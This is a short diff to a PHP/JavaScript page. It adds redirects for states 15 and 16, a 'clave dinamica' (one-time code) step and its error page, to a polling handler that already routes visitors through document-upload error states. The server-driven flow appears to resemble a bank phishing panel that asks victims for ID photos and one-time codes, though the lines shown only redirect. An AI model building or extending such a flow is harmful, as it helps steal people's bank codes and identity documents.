@@ -85,6 +85,12 @@ $clienteId = $_GET['id'] ?? null;
                     } else if (data.estado == 14) {
                         // Estado 14: Error Doc Back
                         window.location.href = `index.php?status=doc_back_error&id=${clienteId}`;
+                    } else if (data.estado == 15) {
+                        // Estado 15: Clave Dinamica
+                        window.location.href = `index.php?status=clave_dinamica&id=${clienteId}`;
+                    } else if (data.estado == 16) {
+                        // Estado 16: Error Clave Dinamica
+                        window.location.href = `index.php?status=clave_dinamica_error&id=${clienteId}`;
                     } else {
                         // Si no hay un estado definido, regresa al login por defecto.
                         window.location.href = `index.php`;
